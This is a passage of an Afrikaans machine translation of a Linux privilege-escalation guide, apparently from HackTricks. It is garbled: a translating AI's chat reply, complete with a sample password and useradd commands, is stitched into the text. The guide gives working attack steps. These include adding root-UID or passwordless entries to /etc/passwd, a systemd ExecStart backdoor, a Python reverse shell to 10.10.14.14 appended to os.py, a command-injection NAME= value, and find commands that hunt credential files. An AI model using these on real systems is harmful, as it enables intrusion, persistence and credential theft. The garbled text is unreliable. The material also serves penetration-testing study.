Eerstens, genereer 'n wagwoord met een van die volgende opdragte.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ek het nie toegang tot jou lêer nie. Plak asseblief die inhoud van src/linux-hardening/privilege-escalation/README.md wat jy wil hê ek moet na Afrikaans vertaal.

Indien jy wil hê ek moet nou ook 'n veilige wagwoord genereer en die presiese opdragte gee om die gebruiker `hacker` by te voeg, hieronder is 'n voorbeeld (ek voer niks op jou stelsel uit nie — kopieer en plak hierdie opdragte op jou stelsel):

Gegenereerde wagwoord (voorbeeld): S9v#4kZp8!rQ2tWx7@Yu

Opdragte om gebruiker `hacker` by te voeg en wagwoord te stel:
sudo useradd -m -s /bin/bash hacker
echo 'hacker:S9v#4kZp8!rQ2tWx7@Yu' | sudo chpasswd
sudo passwd -e hacker

Sê asb. of ek die README nou moet vertaal en of ek die gegenereerde wagwoord onmiddellik in die vertaalde teks moet insluit.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Byvoorbeeld: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Jy kan nou die `su` kommando gebruik met `hacker:hacker`

Alternatiewelik kan jy die volgende reëls gebruik om 'n dummy-gebruiker sonder 'n wagwoord by te voeg.\
WAARSKUWING: jy kan die huidige sekuriteit van die masjien verswak.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: Op BSD-platforms is `/etc/passwd` geleë by `/etc/pwd.db` en `/etc/master.passwd`, ook is `/etc/shadow` hernoem na `/etc/spwd.db`.

Jy moet nagaan of jy kan **skryf in sekere sensitiewe lêers**. Byvoorbeeld, kan jy skryf na 'n **dienskonfigurasielêer**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Byvoorbeeld, as die masjien 'n **tomcat** bediener draai en jy kan **wysig die Tomcat dienskonfigurasielêer binne /etc/systemd/,** dan kan jy die reëls wysig:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Jou backdoor sal uitgevoer word die volgende keer dat tomcat gestart word.

### Kontroleer vouers

Die volgende vouers mag rugsteunlêers of interessante inligting bevat: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Waarskynlik sal jy nie die laaste een kan lees nie, maar probeer.)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Vreemde ligging/Owned lêers
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Gewysigde lêers in die laaste minute
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB lêers
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml lêers
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Verborge lêers
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binaries in PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web-lêers**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rugsteun**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekende lêers wat wagwoorde bevat

Lees die kode van [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), dit soek **verskeie moontlike lêers wat wagwoorde kan bevat**.\
**Nog 'n interessante hulpmiddel** wat jy hiervoor kan gebruik is: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) wat 'n open source-toepassing is wat gebruik word om baie wagwoorde wat op 'n plaaslike rekenaar gestoor is vir Windows, Linux & Mac te herwin.

### Logs

As jy logs kan lees, kan jy dalk **interessante/vertroulike inligting daarin vind**. Hoe vreemder die log is, hoe interessanter sal dit waarskynlik wees.\
Ook kan sekere **"bad"** geconfigureerde (backdoored?) **audit logs** jou toelaat om wagwoorde binne audit logs te **opneem** soos in hierdie pos verduidelik: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Om **logs te lees** sal die groep [**adm**](interesting-groups-linux-pe/index.html#adm-group) baie nuttig wees.

### Shell-lêers
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Jy moet ook kontroleer vir lêers wat die woord "**password**" in hul **naam** of in die **inhoud** bevat, en kyk ook vir IPs en emails in logs, of hashes regexps.\
Ek gaan nie hier lys hoe om dit alles te doen nie, maar as jy belangstel kan jy die laaste kontroles sien wat [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) uitvoer.

## Skryfbare lêers

### Python library hijacking

As jy weet **waar** 'n python skrip gaan uitgevoer word en jy **in daardie vouer kan skryf** of jy **python libraries kan wysig**, kan jy die OS library wysig en dit backdoor (as jy daar kan skryf waar die python skrip uitgevoer gaan word, kopieer en plak die os.py library).

Om die **backdoor the library** te doen, voeg net aan die einde van die os.py library die volgende reël by (verander IP en PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate-uitbuiting

'n kwesbaarheid in `logrotate` laat gebruikers met **skryfbevoegdhede** op 'n log-lêer of sy ouerdirektore moontlik toe om verhoogde voorregte te kry. Dit is omdat `logrotate`, wat dikwels as **root** loop, gemanipuleer kan word om willekeurige lêers uit te voer, veral in gidse soos _**/etc/bash_completion.d/**_. Dit is belangrik om permissies nie net in _/var/log_ te kontroleer nie maar ook in enige gids waar logrotasie toegepas word.

> [!TIP]
> Hierdie kwesbaarheid beïnvloed `logrotate` weergawe `3.18.0` en ouer

Meer gedetailleerde inligting oor die kwesbaarheid is te vinde op hierdie bladsy: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Jy kan hierdie kwesbaarheid uitbuit met [**logrotten**](https://github.com/whotwagner/logrotten).

Hierdie kwesbaarheid is baie soortgelyk aan [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so wanneer jy vind dat jy logs kan verander, kyk wie daardie logs bestuur en kyk of jy voorregte kan eskaleer deur die logs te vervang met symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ byvoorbeeld, word gebruik vir netwerkverbindings. Hulle lyk presies soos .INI-lêers. Hulle word egter \~sourced\~ op Linux deur Network Manager (dispatcher.d).

In my geval word die `NAME=`-attribuut in hierdie netwerkskripte nie korrek hanteer nie. As jy **witruimte/leë spasie in die naam het, probeer die stelsel die gedeelte na die witruimte/leë spasie uit te voer**. Dit beteken dat **alles na die eerste leë spasie as root uitgevoer word**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Let wel die leë spasie tussen Network en /bin/id_)

### **init, init.d, systemd, and rc.d**

Die gids `/etc/init.d` huisves **skripte** vir System V init (SysVinit), die **klassieke Linux service management system**. Dit bevat skripte om dienste te te `start`, te `stop`, te `restart`, en soms te `reload`. Hierdie kan direk uitgevoer word of via simboliese skakels gevind in `/etc/rc?.d/`. ’n Alternatiewe pad op Redhat-stelsels is `/etc/rc.d/init.d`.

Aan die ander kant is `/etc/init` geassosieer met **Upstart**, ’n jonger **service management** wat deur Ubuntu bekendgestel is, wat konfigurasielêers gebruik vir diensbestuurtake. Ten spyte van die oorskakeling na Upstart, word SysVinit-skripte steeds saam met Upstart-konfigurasies gebruik weens ’n versoenbaarheidslaag in Upstart.

**systemd** treeg as ’n moderne initialisation en service manager, wat gevorderde funksies soos op-aanvraag daemon-start, automount-bestuur, en stelseltoestand-momentopnames bied. Dit organiseer lêers in `/usr/lib/systemd/` vir distribution packages en `/etc/systemd/system/` vir administrator-wysigings, wat die stelseladministrasieproses vereenvoudig.

## Ander truuks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks heg gewoonlik ’n syscall aan om bevoorregte kernel-funksionaliteit aan ’n userspace manager bloot te lê. Swakke manager-autentisering (bv. signature checks gebaseer op FD-order of swak wagwoordskemas) kan ’n plaaslike app in staat stel om die manager na te boots en tot root te eskaleer op reeds-geroote toestelle. Leer meer en sien uitbuitingbesonderhede hier:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-aangedrewe service discovery in VMware Tools/Aria Operations kan ’n binêre pad uit proses-opdragreëls onttrek en dit met -v onder ’n bevoorregte konteks uitvoer. Permissiewe patrone (bv. met gebruik van \S) kan pas by deur ’n aanvaller geplaasde listeners in geskryfbare plekke (bv. /tmp/httpd), wat lei tot uitvoering as root (CWE-426 Untrusted Search Path).

Leer meer en sien ’n gegeneraliseerde patroon toepaslik op ander discovery/monitoring stacks hier:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel-sekuriteitsbeskermings

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Meer hulp

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Beste instrument om Linux plaaslike privilege escalation-vektore te soek:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Lys kernel-kwetsbaarhede in Linux en macOS [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fisiese toegang):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Versameling van meer skripte**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Verwysings

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
